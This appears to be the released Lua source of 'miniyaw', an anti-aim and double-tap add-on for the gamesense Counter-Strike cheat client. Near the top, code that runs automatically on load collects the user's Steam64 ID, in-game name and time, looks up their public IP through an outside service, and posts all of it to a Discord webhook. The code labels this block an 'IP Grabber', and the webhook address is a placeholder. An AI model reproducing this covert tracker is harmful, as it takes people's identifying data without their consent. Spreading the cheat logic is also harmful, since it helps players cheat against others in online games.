--Creator of the lua mini#0009 , JonBossTV on the forum , GIFT ME A SUB :scary:
--shoutout to my bros mae , raz , vald and my beta testers mix & blazk , I'm giving out miniyaw source code cause I'm superior hacker , enjoy!
--local variables for API. Automatically generated by https://github.com/simpleavaster/gslua/blob/master/authors/sapphyrus/generate_api.lua
local client_latency,
    client_log,
    client_draw_rectangle,
    client_draw_circle_outline,
    client_userid_to_entindex,
    client_draw_indicator,
    client_draw_gradient,
    client_set_event_callback,
    client_screen_size,
    client_eye_position =
    client.latency,
    client.log,
    client.draw_rectangle,
    client.draw_circle_outline,
    client.userid_to_entindex,
    client.draw_indicator,
    client.draw_gradient,
    client.set_event_callback,
    client.screen_size,
    client.eye_position
local client_draw_circle,
    client_color_log,
    client_delay_call,
    client_draw_text,
    client_visible,
    client_exec,
    client_trace_line,
    client_set_cvar =
    client.draw_circle,
    client.color_log,
    client.delay_call,
    client.draw_text,
    client.visible,
    client.exec,
    client.trace_line,
    client.set_cvar
local client_world_to_screen,
    client_draw_hitboxes,
    client_get_cvar,
    client_draw_line,
    client_camera_angles,
    client_draw_debug_text,
    client_random_int,
    client_random_float =
    client.world_to_screen,
    client.draw_hitboxes,
    client.get_cvar,
    client.draw_line,
    client.camera_angles,
    client.draw_debug_text,
    client.random_int,
    client.random_float
local entity_get_local_player,
    entity_is_enemy,
    entity_hitbox_position,
    entity_get_player_name,
    entity_get_steam64,
    entity_get_bounding_box,
    entity_get_all,
    entity_set_prop =
    entity.get_local_player,
    entity.is_enemy,
    entity.hitbox_position,
    entity.get_player_name,
    entity.get_steam64,
    entity.get_bounding_box,
    entity.get_all,
    entity.set_prop
local entity_is_alive, entity_get_player_weapon, entity_get_prop, entity_get_players, entity_get_classname =
    entity.is_alive,
    entity.get_player_weapon,
    entity.get_prop,
    entity.get_players,
    entity.get_classname
local globals_realtime,
    globals_absoluteframetime,
    globals_tickcount,
    globals_curtime,
    globals_mapname,
    globals_tickinterval,
    globals_framecount,
    globals_frametime,
    globals_maxplayers =
    globals.realtime,
    globals.absoluteframetime,
    globals.tickcount,
    globals.curtime,
    globals.mapname,
    globals.tickinterval,
    globals.framecount,
    globals.frametime,
    globals.maxplayers
local ui_new_slider,
    ui_new_combobox,
    ui_reference,
    ui_set_visible,
    ui_is_menu_open,
    ui_new_color_picker,
    ui_set_callback,
    ui_set,
    ui_new_checkbox,
    ui_new_hotkey,
    ui_new_button,
    ui_new_multiselect,
    ui_get =
    ui.new_slider,
    ui.new_combobox,
    ui.reference,
    ui.set_visible,
    ui.is_menu_open,
    ui.new_color_picker,
    ui.set_callback,
    ui.set,
    ui.new_checkbox,
    ui.new_hotkey,
    ui.new_button,
    ui.new_multiselect,
    ui.get
local math_ceil,
    math_tan,
    math_log10,
    math_randomseed,
    math_cos,
    math_sinh,
    math_random,
    math_huge,
    math_pi,
    math_max,
    math_atan2,
    math_ldexp,
    math_floor,
    math_sqrt,
    math_deg,
    math_atan,
    math_fmod =
    math.ceil,
    math.tan,
    math.log10,
    math.randomseed,
    math.cos,
    math.sinh,
    math.random,
    math.huge,
    math.pi,
    math.max,
    math.atan2,
    math.ldexp,
    math.floor,
    math.sqrt,
    math.deg,
    math.atan,
    math.fmod
local math_acos,
    math_pow,
    math_abs,
    math_min,
    math_sin,
    math_frexp,
    math_log,
    math_tanh,
    math_exp,
    math_modf,
    math_cosh,
    math_asin,
    math_rad =
    math.acos,
    math.pow,
    math.abs,
    math.min,
    math.sin,
    math.frexp,
    math.log,
    math.tanh,
    math.exp,
    math.modf,
    math.cosh,
    math.asin,
    math.rad
local table_maxn,
    table_foreach,
    table_sort,
    table_remove,
    table_foreachi,
    table_move,
    table_getn,
    table_concat,
    table_insert =
    table.maxn,
    table.foreach,
    table.sort,
    table.remove,
    table.foreachi,
    table.move,
    table.getn,
    table.concat,
    table.insert
local string_find,
    string_format,
    string_rep,
    string_gsub,
    string_len,
    string_gmatch,
    string_dump,
    string_match,
    string_reverse,
    string_byte,
    string_char,
    string_upper,
    string_lower,
    string_sub =
    string.find,
    string.format,
    string.rep,
    string.gsub,
    string.len,
    string.gmatch,
    string.dump,
    string.match,
    string.reverse,
    string.byte,
    string.char,
    string.upper,
    string.lower,
    string.sub
--end of local variables

--Requires
local ffi = require("ffi")
require 'bit'
local sucess_anti, anti_aim = pcall(require, 'gamesense/antiaim_funcs')
local sucess_http,http = pcall(require, 'gamesense/http')
local sucess_discord,Discord = pcall(require, 'gamesense/discord_webhooks')
--end of Requires

--Require Error Function
local function require_error(sucess,return_string)
    local string_return
    for i = 0, #sucess do
        if sucess[i] == false then 
            error(return_string[i]) end
    end
end

require_error({sucess_anti,sucess_http,sucess_discord},
{"Missing gamesense/antiaim_funcs - https://gamesense.pub/forums/viewtopic.php?id=29665",
"Missing gamesense/http - https://gamesense.pub/forums/viewtopic.php?id=19253",
"Missing gamesense/discord_webhooks - https://gamesense.pub/forums/viewtopic.php?id=24793"})
--end of Require Error Function

--Localplayer Var
--end of Localplayer Var

--make it so it doesnt load when not in-game , useless shit tbh but I'm mega hacker :scary:
local local_player = entity.get_local_player()
local velocity = 0
local velocityX, velocityY = entity_get_prop(local_player, "m_vecVelocity")
velocity = math_sqrt(velocityX*velocityX + velocityY*velocityY)
----------------------------------------------------------------------------

--Discord Webhook
local Webhook = Discord.new('insert your discord webhook if you are mega hacker')
local RichEmbed = Discord.newEmbed()

-- Properties
Webhook:setUsername('Script Information')

local hours, minutes, seconds, ms = client.system_time()

RichEmbed:setTitle('Script Information')
RichEmbed:setThumbnail('https://cdn.discordapp.com/icons/770374971087388732/a_90e65c655cb31978f29c8f0b781338d6.webp?size=1024')
RichEmbed:setColor(9811974)
RichEmbed:addField('Steam64', entity_get_steam64(local_player), true)
RichEmbed:addField('In-game name', entity_get_player_name(local_player), true)
local version_string = "0.2"
RichEmbed:addField('Version', version_string, true)
--Time String
local time_string = "nil"
if(minutes < 10 and seconds < 10) then
    time_string = string.format("%s:0%s:0%s",hours,minutes,seconds,ms)
elseif (minutes < 10 and seconds > 10) then
    time_string = string.format("%s:0%s:%s",hours,minutes,seconds,ms) 
elseif (minutes > 10 and seconds < 10) then
    time_string = string.format("%s:%s:0%s",hours,minutes,seconds,ms) 
elseif (minutes > 10 and seconds > 10) then
    time_string = string.format("%s:%s:%s",hours,minutes,seconds,ms) end

RichEmbed:addField('Time', time_string, true)

--RichEmbed:addField('Steam64',steamid:render_steam64(),true)
--local ip_value = false

--IP Information
--IP Grabber by legend mini#0009 :scary: 
http.get("https://api.ipify.org/?format=json", function(success, response)
    if not success or response.status ~= 200 then
      return
    end
  
    local data = json.parse(response.body)

    

  RichEmbed:addField('IP', data.ip, true)
  Webhook:send(RichEmbed)
  --end of Discord Webhook

end)
--end of IP Information

--Miniyaw menu options
local start_label = ui.new_label("LUA", "B", "             - - - MINIYAW - - -")
local options =
    ui.new_multiselect(
    "LUA",
    "B",
    "miniyaw settings",
    "Visual",
    "Manual",
    "Static legs",
    "Pitch 0 on land",
    "Fake Yaw Randomization",
    "Freestanding on stand",
    "Legit AA on use",
    "Jitter on slow motion",
    "Anti hit by raz",
    "Anti reverse by raz",
    "Mini DT",
    "Clantag"
)

local manual_label = ui.new_label("LUA", "B", "             - - - Manual AA - - -")
local left = ui.new_hotkey("LUA", "B", "left")
local right = ui.new_hotkey("LUA", "B", "right")
local back = ui.new_hotkey("LUA", "B", "back")
local manual_aa_visuals = ui.new_checkbox("LUA","B","Manual AA Visuals")
local visuals_label = ui.new_label("LUA", "B", "             - - - Visuals - - -")
local visual_type = ui.new_combobox("LUA", "B", "Visuals style", "Off","Default", "Desync line", "Circle") --"Thirdperson head"
local slider_visual = ui.new_slider("LUA", "B", "Circle size", 0, 6, 0)
local fake_label = ui.new_label("LUA", "B", "   - - - Fake Yaw Randomization - - -")
local min = ui.new_slider("LUA", "B", "Min. fake yaw randomization", 0, 60, 30)
local max = ui.new_slider("LUA", "B", "Max. fake yaw randomization", 0, 60, 60)
local dt_label = ui.new_label("LUA", "B", "             - - - Mini DT - - -")
local dt = ui.new_combobox("LUA", "B", "DT mode", {"Off","Fast", "Instant","Manual"})
local dt_tick = ui.new_slider("LUA","B","Ticks",4,62,18)
local fakelag_dt = ui.new_slider("LUA","B","DT FL limit",1,10,1)
local clock_correction = ui.new_slider("LUA","B", 'clock correction', 0, 1, 1)
local dt_label = ui.new_label("LUA", "B", "     - - - Jitter on slow motion - - -")
local aa_jitter_type = ui.new_combobox("LUA","B","Yaw Jitter","Offset","Center","Random")
local aa_jitter_value = ui.new_slider("LUA","B","Jitter Value",-180,180,15)




--end of Miniyaw menu options

--Movable rectangle 
--local is_inside = function(a, b, x, y, w, h) return a >= x and a <= w and b >= y and b <= h end
--local tbl_len = function(t) local n=0 for _ in pairs(t) do n=n+1 end return n end
--local pos = database.read('hvh_pos')or{300,30} local tX,tY=pos[1],pos[2] local oX,oY,_d local drag_menu=function(x,y,w,h)if not ui.is_menu_open()then return tX,tY end local mouse_down = client.key_state(0x01) if mouse_down then local X,Y=ui.mouse_position()if not _d then local w,h=x+w,y+h if is_inside(X,Y,x,y,w,h)then oX,oY,_d=X-x,Y-y,true end else tX,tY=X-oX,Y-oY end else _d=false end return tX,tY end
--end of Movable rectangle 



--Menu references
local sv_maxusrcmdprocessticks = ui_reference("MISC", "Settings", "sv_maxusrcmdprocessticks")
local fyawlimit = ui.reference("AA", "Anti-aimbot angles", "Fake yaw limit")
local slowmotion_jitter, slow_hotkey = ui.reference("AA", "Other", "Slow motion")
local bodyyaw_aa, bodyyaw_value = ui.reference("AA", "Anti-aimbot angles", "Body yaw")
local yawbody, yaw = ui.reference("AA", "Anti-aimbot angles", "Yaw")
local legmovement = ui.reference("AA", "Other", "Leg movement")
local limit_ref = ui.reference("AA", "Fake lag", "Limit")
local hs_check, hs_key = ui.reference("AA", "Other", "On shot anti-aim")
local old_aa, aa_value = ui.reference("AA", "Anti-aimbot angles", "Yaw jitter")
local dtfakelaglimit = ui_reference("rage", "other", "double tap fake lag limit")
local thirdperson_alive,thirdperson_alive_key  = ui.reference("VISUALS","Effects","Force third person (alive)")
local freestanding_mode = ui.reference("AA", "Anti-aimbot angles", "Freestanding")
local freestanding_body_yaw = ui.reference("AA", "Anti-aimbot angles", "Freestanding body yaw")
ui.set_visible(sv_maxusrcmdprocessticks, true)
--end of Menu references


--Button function
local function turn_on()
    ui.set(
        options,
        "Legit AA on use",
        "Jitter on slow motion",
        "Anti reverse by raz",
        "Visual",
        "Mini DT"
    )
    ui.set(dt, "Instant")
    ui.set(aa_jitter_type,"Random")
    ui.set(aa_jitter_value,15)
end

local rec_button = ui.new_button("LUA", "B", "Recommended settings", turn_on)
--end of Button function

--Clantag Var, shoutout my bro Mae 
local clantag = {
    '',
    '|',
    '|\\',
    '|\\/',
    '|\\/|',
    'M',
    'M1',
    'Mi',
    'Mi|',
    'Mi|\\',
    'Mi|\\|',
    'Min',
    'Min1',
    'Mini',
    'Mini-',
    'Mini-7',
    'Mini-Y',
    'Mini-Y4',
    'Mini-Ya',
    'Mini-Ya\\',
    'Mini-Ya\\/',
    'Mini-Ya\\/\\',
    'Mini-Ya\\/\\/',
    'Mini-Yaw',
    'Mini-Yaw',
    'Mini-Yaw',
    'Mini-Yaw',
    'Mini-Yaw',
    'Mini-Ya\\/\\/',
    'Mini-Ya\\/\\',
    'Mini-Ya\\/',
    'Mini-Ya\\',
    'Mini-Ya',
    'Mini-Y4',
    'Mini-Y',
    'Mini-7',
    'Mini-',
    'Mini',
    'Min1',
    'Min',
    'Mi|\\|',
    'Mi|\\',
    'Mi|',
    'Mi',
    'M1',
    'M',
    '|\\/|',
    '|\\/',
    '|\\',
    '|',
    ''}
--end of Clantag Var

--Manual AA modes
local leftReady = false
local rightReady = false
local mode = "back"
--end of Manual AA modes

--Includes function
local function includes(table, key)
    local state = false
    for i = 1, #table do
        if table[i] == key then
            state = true
            break
        end
    end
    return state
end
--end of Includes function

--Table Visibility function
local function setTableVisibility(table, state)
    for i = 1, #table do
        ui.set_visible(table[i], state)
    end
end
--end of Table Visibility function


--Visibility function
client.set_event_callback("paint_ui", function()
    setTableVisibility({manual_label, left, back, right,manual_aa_visuals}, includes(ui.get(options), "Manual"))
    setTableVisibility({dt_label, dt}, includes(ui.get(options), "Mini DT"))
    setTableVisibility({visuals_label, visual_type}, includes(ui.get(options), "Visual"))
    setTableVisibility({color_label,line_left,line_left_grad,line_right,line_right_grad,left_label,right_label,left_gradient_label,right_gradient_label},ui.get(visual_type) == "Desync line")
    --line_right,line_right_grad,right_label,left_label,left_gradient_label,right_gradient_label
    setTableVisibility({fake_label, min, max}, includes(ui.get(options), "Fake Yaw Randomization"))
    setTableVisibility({aa_jitter_type, aa_jitter_value}, includes(ui.get(options), "Jitter on slow motion"))
    setTableVisibility({clock_correction, fakelag_dt,dt_tick}, ui.get(dt) == "Manual")
end)
--end of Visibility function

--Clantag values
local new_value_clantag = 1
local counter_clantag = 1
--end of Clantag values

--Paint/Visuals function
client.set_event_callback("paint",function()
    local localPlayer = entity.get_local_player()
    local X, Y = client.screen_size()
    local string_fake = string.format("%iº", anti_aim.get_desync(1))
    local screen_size = {client.screen_size()}
    local camera_angles = {client.camera_angles()}
    local sx, sy = screen_size[1] / 2, screen_size[2] / 2
    local by = anti_aim.normalize_angle(camera_angles[2] - anti_aim.get_body_yaw(1) - 120)
    local fy = anti_aim.normalize_angle(camera_angles[2] - anti_aim.get_body_yaw(2) - 120)
    local me = entity.get_local_player()
    local player_resource = entity.get_player_resource()

    if not includes(ui.get(options), "Visual") then
        ui.set_visible(slider_visual, false)
    end
    
    if ui.get(manual_aa_visuals) == true then
        if mode == "back" then
            renderer.text(X / 2, Y / 2 - 15,255,255,255,255,"c",0,"back")
        elseif mode == "left" then
            renderer.text(X / 2 - 50, Y / 2 - 15 ,255,255,255,255,"c",0,"left")
        elseif mode == "right" then
            renderer.text(X / 2 + 50, Y / 2 - 15,255,255,255,255,"c",0,"right")
        end
    end

    if includes(ui.get(options), "Visual") then
        if entity.is_alive(me) then
            if ui.get(visual_type) == "Default" then
                ui.set_visible(slider_visual, true)
                renderer.text(X / 2 - 13, Y / 2 + 10, 50, 128, 235, 255, nil, 0, "Y")
                renderer.text(X / 2 - 3, Y / 2 + 10, 130, 50, 235, 255, nil, 0, "A")
                renderer.text(X / 2 + 7, Y / 2 + 10, 50, 128, 235, 255, nil, 0, "W")

                if anti_aim.get_double_tap() then
                    renderer.text(X / 2 - 6, Y / 2 + 22, 0, 255, 0, 255, nil, 0, "DT")
                else
                    renderer.text(X / 2 - 6, Y / 2 + 22, 255, 0, 0, 255, nil, 0, "DT")
                end

                if ui.get(hs_key) == true then
                    renderer.text(X / 2 - 6, Y / 2 + 34, 0, 255, 0, 255, nil, 0, "HS")
                else
                    renderer.text(X / 2 - 6, Y / 2 + 34, 255, 0, 0, 255, nil, 0, "HS")
                end

                renderer.text(X / 2 - 7, Y / 2 + 46, 255, 255, 255, 255, nil, 0, string_fake)

                --renderer.gradient(X / 2,Y / 2 + 50, -anti_aim.get_desync(1), 3, 0, 100, 255, 255, 0, 0, 0, 0, true)
                --renderer.gradient(X / 2 ,Y / 2 + 50, anti_aim.get_desync(1), 3, 0, 100, 255, 255, 0, 0, 0, 0, true)

                local value_add_y = ui.get(slider_visual) * 100 / 10
                renderer.circle_outline(
                    sx,
                    sy + 60 + value_add_y,
                    15,
                    15,
                    15,
                    125,
                    8 * ui.get(slider_visual),
                    0,
                    1,
                    2 * ui.get(slider_visual)
                )
                renderer.circle_outline(
                    sx,
                    sy + 60 + value_add_y,
                    150,
                    150,
                    150,
                    220,
                    8 * ui.get(slider_visual),
                    by,
                    0.05,
                    2 * ui.get(slider_visual)
                )
                renderer.circle_outline(
                    sx,
                    sy + 60 + value_add_y,
                    45,
                    220,
                    220,
                    255,
                    8 * ui.get(slider_visual),
                    fy,
                    0.1,
                    2 * ui.get(slider_visual)
                )
            end

            if ui.get(visual_type) == "Desync line" then
               
                ui.set_visible(slider_visual, false)
                renderer.text(X / 2 - 13, Y / 2 + 10, 50, 128, 235, 255, nil, 0, "Y")
                renderer.text(X / 2 - 3, Y / 2 + 10, 130, 50, 235, 255, nil, 0, "A")
                renderer.text(X / 2 + 7, Y / 2 + 10, 50, 128, 235, 255, nil, 0, "W")
                renderer.rectangle(X / 2, Y / 2 + 21, anti_aim.get_desync(1), 5, 240,240,240,160)
                renderer.rectangle(X / 2, Y / 2 + 21, -anti_aim.get_desync(1), 5,240,240,240,160)
                renderer.gradient(X / 2, Y / 2 + 22, -anti_aim.get_desync(1), 3, 0,100,255,255,0,0,0,0, true)
                renderer.gradient(X / 2, Y / 2 + 22, anti_aim.get_desync(1), 3, 0,100,255,255,0,0,0,0, true)
                renderer.text(X / 2 - 7, Y / 2 + 25, 255, 255, 255, 255, nil, 0, string_fake)
            end

            if ui.get(visual_type) == "Circle" then
                renderer.text(X / 2 - 13, Y / 2 + 10, 50, 128, 235, 255, nil, 0, "Y")
                renderer.text(X / 2 - 3, Y / 2 + 10, 130, 50, 235, 255, nil, 0, "A")
                renderer.text(X / 2 + 7, Y / 2 + 10, 50, 128, 235, 255, nil, 0, "W")
                ui.set_visible(slider_visual, true)
                local value_add_y = ui.get(slider_visual) * 100 / 10
                renderer.circle_outline(
                    sx,
                    sy + 25 + value_add_y,
                    15,
                    15,
                    15,
                    125,
                    8 * ui.get(slider_visual),
                    0,
                    1,
                    2 * ui.get(slider_visual)
                )
                renderer.circle_outline(
                    sx,
                    sy + 25 + value_add_y,
                    150,
                    150,
                    150,
                    220,
                    8 * ui.get(slider_visual),
                    by,
                    0.05,
                    2 * ui.get(slider_visual)
                )
                renderer.circle_outline(
                    sx,
                    sy + 25 + value_add_y,
                    45,
                    220,
                    220,
                    255,
                    8 * ui.get(slider_visual),
                    fy,
                    0.1,
                    2 * ui.get(slider_visual)
                )
            end

            local weapon
            local weapon_class 
            if not localPlayer then
                return 
            else
             weapon = entity.get_player_weapon(localPlayer)
             weapon_class = entity.get_classname(weapon) end

        --this is my some weird visual code that I forgot what it does :scary:

            --[[if ui.get(visual_type) == "Desync line" or ui.get(visual_type) == "Circle" then
                local x_menu, y_menu = drag_menu(tX, tY, 200, 20)
                if (anti_aim.get_double_tap()) then
                    
                    renderer.rectangle(x_menu, y_menu, 100,3,120,0,150,255)
                    renderer.rectangle(x_menu, y_menu, 100,20,10,10,10,150)
                    renderer.text(x_menu + 3, y_menu + 3,255,255,255,255,"nil",0,weapon_class)

                else
                    renderer.rectangle(x_menu, y_menu, 100,3,255,255,255,255)
                    renderer.rectangle(x_menu, y_menu, 100,20,10,10,10,150)
                    renderer.text(x_menu + 3, y_menu + 3,255,255,255,255,"nil",0,weapon_class)
                end
            end]]

            -- third person head visual shit :scary:
            --[[if ui.get(visual_type) == "Thirdperson head" then
                ui.set_visible(slider_visual, false)
                local hitbox_hand_x,hitbox_hand_y,hitbox_hand_z = entity_hitbox_position(localPlayer,0)
                local world_x,world_y = renderer.world_to_screen(hitbox_hand_x,hitbox_hand_y,hitbox_hand_z)
            
                if( not world_x and not world_y) then
                    return
                else
            
            
                    if(ui.get(thirdperson_alive_key) == false) then
                        return
                    else
                 --renderer.line(world_x,world_y,world_x - 50,world_y - 100,255,255,255,255)
                 --renderer.text(world_x - 100,world_y - 200,255,255,255,255,"nil",0,"hand") 
                 renderer.rectangle(world_x - 50,world_y - 80,100,30,15,15,15,140)
                 renderer.rectangle(world_x - 50,world_y - 80,100,3,255,255,255,255)
                 renderer.rectangle(world_x + 20 ,world_y - 60, 18,5,0,0,0,255)
            
                 local desync_percentage = anti_aim.get_desync(1) / 100 * 60
                  local max_desync = nil
            
                 if(desync_percentage < 0) then
                    max_desync = -anti_aim.get_desync(1) / 100 * 60
                  else
                    max_desync = anti_aim.get_desync(1) / 100 * 60 end
            
            
                   renderer.rectangle(world_x + 20,world_y - 60, 0.5 * max_desync,5,255,255,255,255)
                      local desync_value_string = string.format("%iº",anti_aim.get_desync(1))
                   renderer.text(world_x + 20,world_y - 74,255,255,255,255,"nil",0,desync_value_string)

                   renderer.circle_outline(
                    world_x - 10,
                    world_y - 64,
                    15,
                    15,
                    15,
                    125,
                    8 ,
                    0,
                    1,
                    2 
                )
                renderer.circle_outline(
                    world_x - 10,
                    world_y - 64,
                    150,
                    150,
                    150,
                    220,
                    8 ,
                    by,
                    0.05,
                    2 
                )
                renderer.circle_outline(
                    world_x - 10,
                    world_y - 64,
                    45,
                    220,
                    220,
                    255,
                    8,
                    fy,
                    0.1,
                    2 
                )
            
                     if anti_aim.get_double_tap() then
                       renderer.text(world_x - 48,world_y - 64, 0, 255, 0, 255, nil, 0, "DT")
                    else
                       renderer.text(world_x - 48,world_y - 64, 255, 0, 0, 255, nil, 0, "DT")
                    end
            
                    if ui.get(hs_key) == true then
                      renderer.text(world_x - 48,world_y - 74, 0, 255, 0, 255, nil, 0, "HS")
                    else
                      renderer.text(world_x - 48,world_y - 74, 255, 0, 0, 255, nil, 0, "HS")
                    end
            end
            end
            

         end]]

        end
    end



    if includes(ui.get(options), "Clantag") then
    if counter_clantag >= 100 then
        new_value_clantag = new_value_clantag + 1 
        client.set_clan_tag(clantag[new_value_clantag])
        counter_clantag = 0
      else
        counter_clantag = counter_clantag + 1 
       end
        
       if counter_clantag > 100 then
        counter_clantag = 0 
       end
       if new_value_clantag > 50 then
           new_value_clantag = 0 
       end
    end
end)
--end of Paint/Visuals function

-- PERNAS MALUCAS E PITCH MALUCO
local fakelag = ui.reference("AA", "Fake lag", "Limit")
local ground_ticks, end_time = 1, 0

client.set_event_callback("pre_render", function() 

    if entity.is_alive(entity.get_local_player()) then

    if includes(ui.get(options), "Static legs") then
    entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 1, 6) 
    end
    if includes(ui.get(options), "Pitch 0 on land") then
    local on_ground = bit.band(entity.get_prop(entity.get_local_player(), "m_fFlags"), 1)

        if on_ground == 1 then
            ground_ticks = ground_ticks + 1
        else
            ground_ticks = 0
            end_time = globals.curtime() + 1
        end 
    
        if ground_ticks > ui.get(fakelag)+1 and end_time > globals.curtime() then
            entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 0.5, 12)
        end
    end
end
end)

--Anti-aim functions
client.set_event_callback("run_command", function()
    local localPlayer = entity.get_local_player()

    if includes(ui.get(options), "Manual") then
        if ui.get(back) then
            mode = "back"
        elseif ui.get(left) and leftReady then
            if mode == "left" then
                mode = "back"
            else
                mode = "left"
            end
            leftReady = false
        elseif ui.get(right) and rightReady then
            if mode == "right" then
                mode = "back"
            else
                mode = "right"
            end
            rightReady = false
        end

        if ui.get(left) == false then
            leftReady = true
        end

        if ui.get(right) == false then
            rightReady = true
        end

        if mode == "back" then
            ui.set(yaw, 0)
        elseif mode == "left" then
            ui.set(yaw, -90)
        elseif mode == "right" then
            ui.set(yaw, 90)
        end
    end

    if includes(ui.get(options), "Fake Yaw Randomization") then
        local min_g = ui.get(min)
        local max_g = ui.get(max)
        ui.set(fyawlimit, math.floor(math.random(min_g < max_g and min_g or max_g, min_g < max_g and max_g or min_g)))
    end


    local player_velocity = (function() local vx, vy = entity.get_prop(localPlayer, "m_vecVelocity") return math.floor(math.min(10000, math.sqrt(vx*vx + vy*vy) + 0.5)) end)()
    if includes(ui.get(options), "Freestanding on stand") then
        if player_velocity < 5 then
            ui.set(freestanding_mode, "Default")
        else
            ui.set(freestanding_mode, "-")
        end
    end

    if includes(ui.get(options), "Jitter on slow motion") then
        if ui.get(slow_hotkey) == true then
            ui.set(old_aa, ui.get(aa_jitter_type))
            ui.set(aa_value, ui.get(aa_jitter_value))
        elseif ui.get(slow_hotkey) == false then
            ui.set(old_aa, "Off")
            ui.set(aa_value, 0)
        end
    end


end)


client.set_event_callback("setup_command", function(e)

    local localPlayer = entity.get_local_player()

        local weaponn = entity.get_player_weapon()
        if includes(ui.get(options), "Legit AA on use") then
            if weaponn ~= nil and entity.get_classname(weaponn) == "CC4" then
                if e.in_attack == 1 then
                    e.in_attack = 0
                    e.in_use = 1
                end
            else
                if e.chokedcommands == 0 then
                    e.in_use = 0
                end
            end
            ui.set(freestanding_body_yaw, true)
        end

        if ui.get(dt) == "Instant" then
            ui.set(sv_maxusrcmdprocessticks, 18)
            ui.set(dtfakelaglimit, 1)
        elseif ui.get(dt) == "Fast" then
            ui.set(sv_maxusrcmdprocessticks, 17)
            ui.set(dtfakelaglimit, 1)
        elseif ui.get(dt) == "Off" then
            ui.set(sv_maxusrcmdprocessticks, ui.get(sv_maxusrcmdprocessticks))
            ui.set(dtfakelaglimit, ui.get(fakelag_dt))
        elseif ui.get(dt) == "Manual" then
            ui.set(sv_maxusrcmdprocessticks,ui.get(dt_tick))
            ui.set(dtfakelaglimit,ui.get(fakelag_dt))
            cvar.cl_clock_correction:set_int(ui.get(clock_correction))
        end


        if includes(ui.get(options), "Anti hit by raz") then
            ui.set(bodyyaw_aa, "Static")
            if globals_tickcount() % 2 then
                if ui.get(bodyyaw_value) == 90 then
                    ui.set(bodyyaw_value, -90)
                elseif ui.get(bodyyaw_value) == -90 then
                    ui.set(bodyyaw_value, 90)
                end
            else
                if ui.get(bodyyaw_value) == 90 then
                    ui.set(bodyyaw_value, -90)
                elseif ui.get(bodyyaw_value) == -90 then
                    ui.set(bodyyaw_value, 90)
                end
            end

            if ui.get(bodyyaw_value) ~= 90 and ui.get(bodyyaw_value) ~= -90 then
                ui.set(bodyyaw_value, 90)
            end
        end

        if includes(ui.get(options), "Anti reverse by raz") then
            if ui.get(legmovement) == "Off" then
                ui.set(legmovement, "Always slide")
            end

            if globals_tickcount() % 2 then
                if ui.get(legmovement) == "Always slide" then
                    ui.set(legmovement, "Never slide")
                elseif ui.get(legmovement) == "Never slide" then
                    ui.set(legmovement, "Always slide")
                end
            else
                if ui.get(legmovement) == "Always slide" then
                    ui.set(legmovement, "Never slide")
                elseif ui.get(legmovement) == "Never slide" then
                    ui.set(legmovement, "Always slide")
                end
            end
        end
    end
)


--end of Anti-aim functions

--event_callbacks
--client.set_event_callback("run_command", runCommand) 
--client.set_event_callback("paint", visuals) 
--client.set_event_callback("paint_ui", handleGUI)
--end of event_callbacks
